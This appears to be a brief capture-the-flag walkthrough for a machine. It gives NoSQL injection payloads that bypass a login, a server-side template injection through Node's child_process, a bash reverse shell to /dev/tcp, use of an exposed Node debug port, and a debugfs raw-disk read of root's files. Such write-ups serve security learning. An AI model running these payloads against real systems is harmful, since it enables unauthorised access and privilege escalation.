1) Finding the user flag

First, we bypass the login form with a NoSQLI, using the payload;
{"username":{"$ne":""},"password":{"$ne":""}}

if the above payload doesn't work (which it didn't for me at some points) use;
{"username":{"$ne":"guest"},"password":{"$ne":""}}

In the staff EJS confirmation template, we replace guest with
global.process.mainModule.require('child_process').execSync('cmd')  

Replace cmd with the actuall command, like;
bash -c "bash -i >& /dev/tcp/lHost/lPort 0>&1"

set up a listenner before using the cmd


2) Gaining horizontal privileges

Verifying running processes, we find a node instance running on the target box on port 9229 (defualt node debug port) as pipelinesvc

Uploading the n2h script to the machine, we can achieve code execution as the user pipelinesvc with;
node /tmp/n2h.js "id"



3) Gaining root access

User pipelinesvc has raw storage RW-access "6(disk)"

So, we list the avialable partitions with;
node /tmp/n2h.js "lsblk"

Checking out for possible disk, we identify nvme0n1p1 having a MOUNTPOINT of / (root mount point)

Thus we execute root commands using;
node /tmp/n2h.js 'debugfs -R "cat /root/root.txt" /dev/nvme0n1p1'

bypassing checks permission checks with debugfs to read the raw disk block
